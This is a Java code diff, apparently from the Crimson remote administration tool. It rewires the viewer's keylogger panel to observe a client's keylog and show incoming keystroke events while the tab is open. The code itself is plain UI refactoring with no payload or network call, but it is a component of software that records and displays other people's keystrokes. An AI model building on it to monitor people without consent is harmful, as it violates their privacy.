@@ -22,6 +22,8 @@ import java.awt.CardLayout;
 import java.awt.Insets;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.util.Observable;
+import java.util.Observer;
 
 import javax.swing.Box;
 import javax.swing.JButton;
@@ -30,10 +32,8 @@ import javax.swing.JPanel;
 
 import com.subterranean_security.crimson.core.misc.EH;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
-import com.subterranean_security.crimson.sv.keylogger.LogCallback;
 import com.subterranean_security.crimson.sv.profile.ClientProfile;
 import com.subterranean_security.crimson.universal.stores.PrefStore;
-import com.subterranean_security.crimson.universal.stores.PrefStore.PTag;
 import com.subterranean_security.crimson.viewer.ui.UIUtil;
 import com.subterranean_security.crimson.viewer.ui.common.components.Console;
 import com.subterranean_security.crimson.viewer.ui.common.panels.sl.epanel.EPanel;
@@ -42,9 +42,11 @@ import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.k
 
 import aurelienribon.slidinglayout.SLSide;
 
-public class Keylogger extends JPanel implements CPPanel {
+public class Keylogger extends JPanel implements CPPanel, Observer {
 
 	private static final long serialVersionUID = 1L;
+
+	private ClientProfile profile;
 
 	private JPanel selection_panel;
 	private JPanel logs_panel;
@@ -68,7 +70,8 @@ public class Keylogger extends JPanel implements CPPanel {
 	private boolean flatView;
 
 	public Keylogger(ClientProfile profile, Console console) {
-		init(profile, console);
+		this.profile = profile;
+		init(console);
 		try {
 			flatView = PrefStore.getPref().getBoolean(PrefStore.PTag.VIEW_KEYLOG_FLAT);
 		} catch (Exception e) {
@@ -76,7 +79,7 @@ public class Keylogger extends JPanel implements CPPanel {
 		}
 	}
 
-	public void init(ClientProfile profile, Console console) {
+	public void init(Console console) {
 
 		setLayout(new BorderLayout(0, 0));
 
@@ -162,13 +165,6 @@ public class Keylogger extends JPanel implements CPPanel {
 		});
 		menuBar.add(btnSettingsEP);
 
-		profile.getKeylog().addCallback(new LogCallback(this));
-
-	}
-
-	public void addKEvent(EV_KEvent k) {
-		logTree.refreshTree();
-		content.updateContent(k);
 	}
 
 	public void showKeylog() {
@@ -209,13 +205,20 @@ public class Keylogger extends JPanel implements CPPanel {
 
 	@Override
 	public void tabOpened() {
-		// TODO Auto-generated method stub
-
+		profile.getKeylog().addObserver(this);
 	}
 
 	@Override
 	public void tabClosed() {
-		// TODO Auto-generated method stub
+		profile.getKeylog().deleteObserver(this);
+	}
+
+	@Override
+	public void update(Observable o, Object arg) {
+		if (arg instanceof EV_KEvent) {
+			logTree.refreshTree();
+			content.updateContent((EV_KEvent) arg);
+		}
 
 	}
 
